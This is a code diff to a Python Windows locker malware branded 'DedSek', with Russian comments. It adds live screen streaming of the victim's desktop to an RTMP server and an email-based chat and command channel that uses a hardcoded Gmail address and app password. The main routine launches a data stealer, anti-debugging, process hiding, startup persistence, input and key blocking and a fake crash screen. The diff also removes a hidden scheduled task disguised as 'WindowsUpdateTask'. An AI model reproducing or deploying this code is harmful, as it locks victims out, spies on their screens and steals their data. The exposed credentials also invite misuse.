@@ -5,7 +5,7 @@ import time
 import threading
 import tempfile
 import tkinter as tk
-from tkinter import PhotoImage
+from tkinter import PhotoImage, scrolledtext
 import shutil
 import winshell
 from win32com.client import Dispatch
@@ -17,7 +17,12 @@ import json
 import urllib.request
 import urllib.parse
 import smtplib
+import imaplib
+import email
 from email.mime.text import MIMEText
+import cv2
+import numpy as np
+from PIL import ImageGrab
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
@@ -29,9 +34,177 @@ SKULL_BASE64 = "YOUR_BASE64_STRING_HERE"
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
+
+# RTMP Стрим
+RTMP_URL = "rtmp://live.twitch.tv/app/YOUR_STREAM_KEY"
+STREAM_FPS = 15
+STREAM_QUALITY = 50
 # ============================================================
 
 attempts_left = MAX_ATTEMPTS
+
+# ========== ЧАТ С ЖЕРТВОЙ ==========
+class VictimChat:
+    def __init__(self, locker_window):
+        self.locker = locker_window
+        self.chat_visible = False
+        self.chat_window = None
+        
+    def show(self):
+        if self.chat_visible:
+            return
+        
+        self.chat_visible = True
+        self.chat_window = tk.Toplevel(self.locker.win)
+        self.chat_window.title("DedSek Chat")
+        self.chat_window.geometry("400x500")
+        self.chat_window.configure(bg='black')
+        self.chat_window.attributes('-topmost', True)
+        
+        # Заголовок
+        tk.Label(self.chat_window, text="💀 DedSek Messenger 💀", 
+                bg='black', fg='#00FF00', font=('Courier', 12, 'bold')).pack(pady=5)
+        
+        # История сообщений
+        self.chat_history = scrolledtext.ScrolledText(self.chat_window, 
+                                                       bg='#0a0a0a', fg='#00FF00',
+                                                       font=('Courier', 10),
+                                                       height=20)
+        self.chat_history.pack(padx=10, pady=5, fill='both', expand=True)
+        self.chat_history.config(state='disabled')
+        
+        # Поле ввода
+        input_frame = tk.Frame(self.chat_window, bg='black')
+        input_frame.pack(padx=10, pady=5, fill='x')
+        
+        self.msg_entry = tk.Entry(input_frame, bg='#0a0a0a', fg='#00FF00',
+                                  font=('Courier', 10))
+        self.msg_entry.pack(side='left', fill='x', expand=True)
+        self.msg_entry.bind('<Return>', self.send_message)
+        
+        tk.Button(input_frame, text="▶", command=self.send_message,
+                 bg='#00FF00', fg='black', font=('Courier', 10, 'bold'),
+                 width=3).pack(side='right', padx=(5, 0))
+        
+        self.add_message("DedSek", "Ты можешь писать мне сюда. Но пароль это не даст.")
+        self.check_incoming_messages()
+    
+    def send_message(self, event=None):
+        msg = self.msg_entry.get().strip()
+        if msg:
+            self.add_message("ТЫ", msg)
+            self.msg_entry.delete(0, tk.END)
+            
+            # Отправляем тебе на почту
+            send_email(f"💬 Сообщение от жертвы:\n\n{msg}")
+    
+    def add_message(self, sender, msg):
+        self.chat_history.config(state='normal')
+        self.chat_history.insert('end', f'[{sender}]: {msg}\n\n')
+        self.chat_history.see('end')
+        self.chat_history.config(state='disabled')
+    
+    def check_incoming_messages(self):
+        """Проверяет команды с почты"""
+        def check():
+            while self.chat_visible:
+                try:
+                    mail = imaplib.IMAP4_SSL('imap.gmail.com')
+                    mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD)
+                    mail.select('inbox')
+                    
+                    result, data = mail.search(None, 'SUBJECT "COMMAND:"', 'UNSEEN')
+                    
+                    if data[0]:
+                        for num in data[0].split():
+                            result, msg_data = mail.fetch(num, '(RFC822)')
+                            msg = email.message_from_bytes(msg_data[0][1])
+                            
+                            if msg.is_multipart():
+                                for part in msg.walk():
+                                    if part.get_content_type() == "text/plain":
+                                        command = part.get_payload(decode=True).decode()
+                                        
+                                        if command.startswith("MSG:"):
+                                            self.add_message("DedSek", command[4:])
+                                        
+                            mail.store(num, '+FLAGS', '\\Seen')
+                    
+                    mail.close()
+                    mail.logout()
+                except:
+                    pass
+                time.sleep(5)
+        
+        threading.Thread(target=check, daemon=True).start()
+
+# ========== СТРИМ ЭКРАНА ==========
+def start_screen_stream():
+    try:
+        import subprocess
+        
+        command = [
+            'ffmpeg',
+            '-y', '-loglevel', 'error',
+            '-f', 'gdigrab',
+            '-framerate', str(STREAM_FPS),
+            '-i', 'desktop',
+            '-vf', 'scale=1280:720',
+            '-c:v', 'libx264',
+            '-pix_fmt', 'yuv420p',
+            '-preset', 'ultrafast',
+            '-tune', 'zerolatency',
+            '-b:v', '800k',
+            '-maxrate', '800k',
+            '-bufsize', '2000k',
+            '-g', '30',
+            '-f', 'flv',
+            RTMP_URL
+        ]
+        
+        subprocess.run(command, capture_output=True)
+    except:
+        pass
+
+def start_stream_alternative():
+    """Альтернативный стрим через OpenCV"""
+    try:
+        import cv2
+        import numpy as np
+        from PIL import ImageGrab
+        
+        # Размер для стрима
+        width, height = 1280, 720
+        
+        # Пробуем через ffmpeg pipe
+        command = [
+            'ffmpeg',
+            '-y', '-loglevel', 'error',
+            '-f', 'rawvideo',
+            '-vcodec', 'rawvideo',
+            '-s', f'{width}x{height}',
+            '-pix_fmt', 'bgr24',
+            '-r', str(STREAM_FPS),
+            '-i', '-',
+            '-c:v', 'libx264',
+            '-pix_fmt', 'yuv420p',
+            '-preset', 'ultrafast',
+            '-tune', 'zerolatency',
+            '-b:v', '800k',
+            '-f', 'flv',
+            RTMP_URL
+        ]
+        
+        pipe = subprocess.Popen(command, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
+        
+        while True:
+            img = ImageGrab.grab()
+            frame = np.array(img)
+            frame = cv2.resize(frame, (width, height))
+            pipe.stdin.write(frame.tobytes())
+            
+    except:
+        pass
 
 # ========== СТИЛЕР ДАННЫХ ==========
 def steal_data():
@@ -148,26 +321,6 @@ def add_to_startup():
             winreg.CloseKey(key)
         except:
             pass
-        
-        try:
-            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
-  <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings><Hidden>true</Hidden><Enabled>true</Enabled></Settings>
-  <Actions><Exec>
-    <Command>{sys.executable.replace("python.exe", "pythonw.exe")}</Command>
-    <Arguments>"{current_path}"</Arguments>
-  </Exec></Actions>
-</Task>'''
-            task_path = os.path.join(tempfile.gettempdir(), "task.xml")
-            with open(task_path, "w", encoding="utf-16") as f:
-                f.write(task_xml)
-            subprocess.run(f'schtasks /create /tn "WindowsUpdateTask" /xml "{task_path}" /f', 
-                         shell=True, capture_output=True)
-            os.remove(task_path)
-        except:
-            pass
     except:
         pass
 
@@ -252,31 +405,9 @@ to your computer.
 
 ENCRYPTION_FAILED.SYS
 
-PAGE_FAULT_IN_NONPAGED_AREA
-
-If this is the first time you've seen this stop error screen,
-restart your computer. If this screen appears again, follow
-these steps:
-
-Check to make sure any new hardware or software is properly installed.
-If this is a new installation, ask your hardware or software manufacturer
-for any Windows updates you might need.
-
-If problems continue, disable or remove any newly installed hardware
-or software. Disable BIOS memory options such as caching or shadowing.
-If you need to use Safe Mode to remove or disable components, restart
-your computer, press F8 to select Advanced Startup Options, and then
-select Safe Mode.
-
-Technical information:
-
 *** STOP: 0x00000050 (0xFFFFF880009A3B28, 0x0000000000000001, 0xFFFFF80002A7C5B1, 0x0000000000000002)
 
-*** ENCRYPTION_FAILED.SYS - Address FFFFF80002A7C5B1 base at FFFFF80002A0D000, DateStamp 5d4a1f8c
-
-Physical memory dump FAILED with status 0xC000009C
-Contact your system administrator or technical support group for further
-assistance."""
+*** ENCRYPTION_FAILED.SYS - Address FFFFF80002A7C5B1 base at FFFFF80002A0D000"""
         
         lbl.config(text=bsod_text)
         bsod.update()
@@ -371,6 +502,7 @@ class WinLocker:
         
         global attempts_left
         
+        # Картинка
         try:
             img_data = base64.b64decode(SKULL_BASE64)
             img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
@@ -379,20 +511,14 @@ class WinLocker:
             skull_img = PhotoImage(file=img_path)
             lbl_img = tk.Label(self.win, image=skull_img, bg='black')
             lbl_img.image = skull_img
-            lbl_img.place(relx=0.5, rely=0.08, anchor='center')
+            lbl_img.place(relx=0.5, rely=0.05, anchor='center')
         except:
             pass
         
+        # Основное сообщение
         msg = """ПРИВЕТ! ТВОЙ WINDOWS ЗАБЛОКИРОВАН!
 
-ИДИ ЛАПУ СОСИ
-
-ТЫ ДУМАЕШЬ ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ, НЕ ЗНАЕШЬ!
-
-ТЫ ДУМАЕШЬ 123 ИЛИ 123456789 ИЛИ 0000000 И Т.Д.? НЕТ!
-
-ПАРОЛЬ ПОЛНОСТЬЮ ЗАШИФРОВАН, НО Я НЕ ВЫМОГАТЕЛЬ
-ТЫ БУДЕШЬ САМ РАЗГАДЫВАТЬ!
+ТЫ ДУМАЕШЬ ЧТО ЗНАЕШЬ ПАРОЛЬ? НЕТ!
 
 1. standard DES
 $1$rjBkQ1jG$zqthRBo7xAfA4TTwBRhHv/
@@ -409,29 +535,35 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
 5. uuEncode
 +.3@P-C
 
-ЕСЛИ ЧТО, ВСЕ ПАРОЛИ РАЗНЫЕ, НО 1 ВЕРНЫЙ
-УДАЧИ, ДРУГ
-
-КСТАТИ, У ТЕБЯ 10 ПОПЫТОК!"""
+УДАЧИ, ДРУГ. У ТЕБЯ 10 ПОПЫТОК!"""
         
         lbl_msg = tk.Label(self.win, text=msg, bg='black', fg='#00FF00',
-                           font=('Courier', 10, 'bold'), justify='left')
-        lbl_msg.place(relx=0.5, rely=0.48, anchor='center')
+                           font=('Courier', 9, 'bold'), justify='left')
+        lbl_msg.place(relx=0.5, rely=0.42, anchor='center')
         
+        # Кнопка чата
+        self.chat = VictimChat(self)
+        chat_btn = tk.Button(self.win, text="💀 ЧАТ С DedSek 💀", 
+                            command=self.chat.show,
+                            bg='#00FF00', fg='black',
+                            font=('Courier', 12, 'bold'))
+        chat_btn.place(relx=0.5, rely=0.72, anchor='center')
+        
+        # Поле ввода пароля
         center_frame = tk.Frame(self.win, bg='black')
-        center_frame.place(relx=0.5, rely=0.88, anchor='center')
+        center_frame.place(relx=0.5, rely=0.82, anchor='center')
         
         tk.Label(center_frame, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='#00FF00',
-                 font=('Courier', 16, 'bold')).pack(pady=(0, 5))
+                 font=('Courier', 14, 'bold')).pack(pady=(0, 5))
         
-        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 16, 'bold'),
+        self.entry = tk.Entry(center_frame, show="*", font=('Courier', 14, 'bold'),
                               bg='black', fg='#00FF00', insertbackground='#00FF00',
                               relief='solid', bd=2)
-        self.entry.pack(pady=(0, 5), ipadx=50, ipady=5)
+        self.entry.pack(pady=(0, 5), ipadx=40, ipady=3)
         
         self.status = tk.Label(center_frame, text=f"ОСТАЛОСЬ ПОПЫТОК: {attempts_left}",
                                bg='black', fg='#FF0000',
-                               font=('Courier', 14, 'bold'))
+                               font=('Courier', 12, 'bold'))
         self.status.pack()
         
         self.entry.bind('<Return>', self.check_password)
@@ -473,12 +605,20 @@ $1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1
 if __name__ == "__main__":
     anti_debug()
     hide_process()
+    
+    # Стилер
     threading.Thread(target=steal_data, daemon=True).start()
+    
+    # Стрим экрана
+    threading.Thread(target=start_screen_stream, daemon=True).start()
+    
     add_to_startup()
     boot_animation()
     block_input(True)
     prevent_shutdown()
+    
     threading.Thread(target=kill_processes, daemon=True).start()
     threading.Thread(target=block_all_keys, daemon=True).start()
+    
     WinLocker()
     tk.mainloop()
